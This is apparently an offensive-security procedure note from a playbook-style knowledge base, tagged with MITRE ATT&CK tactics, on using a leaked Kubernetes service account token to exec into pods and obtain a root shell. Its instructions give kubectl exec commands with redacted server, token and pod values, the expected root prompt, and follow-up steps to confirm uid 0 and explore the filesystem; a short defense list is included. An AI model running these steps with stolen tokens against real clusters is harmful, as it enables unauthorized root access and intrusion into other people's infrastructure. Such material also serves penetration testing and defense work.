---
tags:
  - kubernetes
  - rce
  - root-access
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/kubectl]]'
  - '[[tools/Image-Editing-Software]]'
  - '[[tools/Chrome]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-set-instance-metadata]]'
  - '[[commands/curl-query-token-info]]'
  - '[[commands/kubectl-get-pods]]'
  - '[[commands/kubectl-create-pod]]'
  - '[[commands/kubectl-delete-pod]]'
  - '[[commands/kubectl-exec-pod]]'
  - '[[commands/kubectl-describe-pod]]'
  - '[[commands/kubectl-get-secret]]'
  - '[[commands/kubectl-exec-pod-with-token]]'
  - '[[commands/kubectl-exec-pod-with-token-namespace]]'
  - '[[commands/id]]'
  - '[[commands/ls]]'
  - '[[commands/exit]]'
platforms:
  - Kubernetes
techniques:
  - '[[Command-Line Interface]]'
  - '[[Deploy Container]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 71df020f-e062-4ee1-ab6f-48c55f6cdf94
created_at: '2025-12-11T06:10:23.430Z'
updated_at: '2025-12-11T06:10:23.430Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
  - '[[TA0004]]'
mitre_techniques:
  - '[[T1059]]'
  - '[[T1610]]'
---
# Gain Root Shell in Kubernetes Containers Using Service Account Token

## Summary

This procedure uses a leaked service account token to authenticate and exec into Kubernetes pods, gaining root shell access.

## Description

With the token, bypass cert-based restrictions to run bash in containers, confirming root privileges and exploring the filesystem.

## Requirements

1. Leaked service account token and ca.crt
2. Kubernetes server URL
3. [[tools/kubectl]] installed

## Defense

Defensive measures and detection strategies:

- Limit service account tokens to minimal privileges
- Use pod security policies
- Monitor exec API calls

## Objectives

1. Obtain interactive shell in pods
2. Confirm root access
3. Explore container environment

## Instructions

### Step 1: Exec into First Pod

**Context**: Gain shell using token.

Execute [[commands/kubectl-exec-pod-with-token]]:

```bash
kubectl --certificate-authority ca.crt --server https://████ --token "█████.██████.███" exec -it w█████████ -- /bin/bash
```

> Expected: Root prompt.

### Step 2: Exec into Second Pod

**Context**: Access another namespace.

Execute [[commands/kubectl-exec-pod-with-token]]:

```bash
kubectl --certificate-authority ca.crt --server https://███████ --token "█████.██████.█████████" exec -it ████████ -n ████████ -- /bin/bash
```

> Expected: Root prompt.

### Step 3: Verify and Explore

**Context**: Confirm access inside shell.

Run [[commands/id]], [[commands/ls]], then [[commands/exit]].

> Expected: uid=0(root); filesystem list.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Privilege Escalation]]

### Techniques

- [[Command-Line Interface]]
- [[Deploy Container]]

### Sub-Techniques



## Commands Used

- [[commands/kubectl-exec-pod-with-token]]
- [[commands/kubectl-exec-pod-with-token]]
- [[commands/id]]
- [[commands/ls]]
- [[commands/exit]]

## Tools Used

- [[tools/kubectl]]

## Tags

- [[kubernetes]]
- [[rce]]
- [[root-access]]
